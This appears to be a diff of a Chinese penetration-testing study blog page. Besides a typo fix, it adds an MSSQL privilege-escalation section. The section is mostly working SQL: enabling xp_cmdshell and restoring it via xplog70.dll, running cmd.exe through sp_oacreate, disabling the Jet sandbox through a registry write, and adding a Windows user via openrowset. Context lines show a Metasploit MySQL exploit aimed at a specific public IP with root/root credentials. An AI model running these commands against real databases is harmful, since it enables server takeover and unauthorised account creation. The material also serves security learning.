@@ -7,12 +7,12 @@
   
   <title>学习思考 | blog小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQ 提权">
+  <meta name="description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQL 提权">
 <meta property="og:type" content="article">
 <meta property="og:title" content="学习思考">
 <meta property="og:url" content="https://my011215.github.io/2023/08/12/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/index.html">
 <meta property="og:site_name" content="blog小窝">
-<meta property="og:description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQ 提权">
+<meta property="og:description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQL 提权">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/390.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/391.png?raw=true">
@@ -22,7 +22,7 @@
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/395.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/394.png?raw=true">
 <meta property="article:published_time" content="2023-08-12T03:12:30.000Z">
-<meta property="article:modified_time" content="2023-08-12T05:43:18.265Z">
+<meta property="article:modified_time" content="2023-08-12T09:45:48.287Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/390.png?raw=true">
@@ -136,7 +136,7 @@
 <li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90">数据库权限</a>
 <ul>
 <li><a href="#mysql%E6%8F%90%E6%9D%83">mysql 提权</a></li>
-<li><a href="#mssq%E6%8F%90%E6%9D%83">MSSQ 提权</a></li>
+<li><a href="#mssql%E6%8F%90%E6%9D%83">MSSQL 提权</a></li>
 </ul>
 </li>
 </ul>
@@ -1001,7 +1001,59 @@ rport 默认 3306</p>
  msf</li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line">set rhosts 47.102.195.100</span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4><span id="mssq-提权"> MSSQ 提权</span></h4>
+<h4><span id="mssql-提权"> MSSQL 提权</span></h4>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.51cto.com/11797152/2411770">https://blog.51cto.com/11797152/2411770</a></p>
+<ol>
+<li>使用 xp_cmdshell 进行提权<br>
+ xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。如果用户拥有管理员 sa 权限则可以用 sp_configure 重修开启它。</li>
+</ol>
+<ul>
+<li>启用：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>关闭：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>执行：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br></pre></td></tr></table></figure>
+<p>如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>使用 sp_oacreate 进行提权<br>
+主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。</li>
+</ol>
+<ul>
+<li>启用：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br></pre></td></tr></table></figure>
+<ul>
+<li>关闭：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure>
+<ul>
+<li>执行：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>使用 SQL Server 沙盒提权</li>
+</ol>
+<ul>
+<li>关闭沙盒模式</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure; </span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>查询沙盒模式等级</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27;</span><br></pre></td></tr></table></figure>
+<p>沙盒模式 SandBoxMode 参数含义（默认是 2）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`0`：在任何所有者中禁止启用安全模式</span><br><span class="line">`1` ：为仅在允许范围内</span><br><span class="line">`2` ：必须在access模式下</span><br><span class="line">`3`：完全开启</span><br><span class="line">openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL </span><br></pre></td></tr></table></figure>
+<ul>
+<li>执行系统命令（增加系统用户）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;) </span><br></pre></td></tr></table></figure>
 
       
     </div>
